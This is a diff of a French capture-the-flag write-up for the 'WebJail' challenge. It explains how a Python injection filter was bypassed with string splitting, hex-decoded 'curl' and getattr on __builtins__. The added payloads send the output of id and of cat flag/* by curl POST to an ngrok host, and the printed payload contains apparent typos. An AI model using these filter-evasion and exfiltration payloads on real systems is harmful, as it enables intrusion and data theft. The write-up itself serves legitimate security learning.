@@ -1,6 +1,6 @@
 # WebJail
 
-**Introduction**
+## Solution
 
 - Le challenge nous fournit une page qui nous offre la possibilité d'exécuter des commandes via un formulaire.
 - Note, les données de formulaire sont représentées de la manière suivante: ``command=rand&execute=Execute``
@@ -49,11 +49,19 @@ J'obtiens ``Blocked``, le filtre a donc trigger une partie de la commande. Ayant
 >> ''.join([chr(int(''.join(c),16)) for s in zip('6375726c'[0::2],'6375726c'[1::2])])
 'curl'
 ```
-Vous avez dû remarquer, j'ai réécrit la fonction ``hex()`` pour éviter une autre fois le filtre. Comme requête finale j'obtiens:
+Vous avez dû remarquer, j'ai réécrit la fonction ``hex()`` pour éviter une autre fois le filtre (Les méthodes ``bytes.fromhex()`` & ``bytearray.fromhex()`` sont filtrés) . Comme requête finale j'obtiens:
 ``);geattr(__builtins__,'__imp''ort__')('o''s').popen(''.join([chr(int(''.join(c),16)) for s in zip('6375726c'[0::2],'6375726c'[1::2])])+'\x20-X\x20POST\x20-d\x20\x22data=$(id)\x22\x20https://rand.ngrok.io/tmp')#``.
 Le serveur me renvoit bien la réponse:
 <br/>
 
 ![image](https://user-images.githubusercontent.com/74382279/157323813-016de65c-4062-467f-a1a1-b2747ddee541.png)
 
+``);geattr(__builtins__,'__imp''ort__')('o''s').popen(''.join([chr(int(''.join(c),16)) for s in zip('6375726c'[0::2],'6375726c'[1::2])])+'\x20-X\x20POST\x20-d\x20\x22data=$(cat flag/*)\x22\x20https://rand.ngrok.io/tmp')#``
 
+J'ai bien aimé l'approche du challenge, plusieurs. Je tiens à préciser que plusieurs techniques d'importation de l'objet __builtins__ étaient filtrés:
+```py
+__builtins__.__import__("os").system("ls")
+__builtins__.__dict__['__import__']("os").system("ls")
+```
+Le module préimporté ``reload()`` était match. La variable ``__class__`` pareil.
+. Je suis donc parti du principe que je devais utiliser ``getattr()`` et ça a marché.
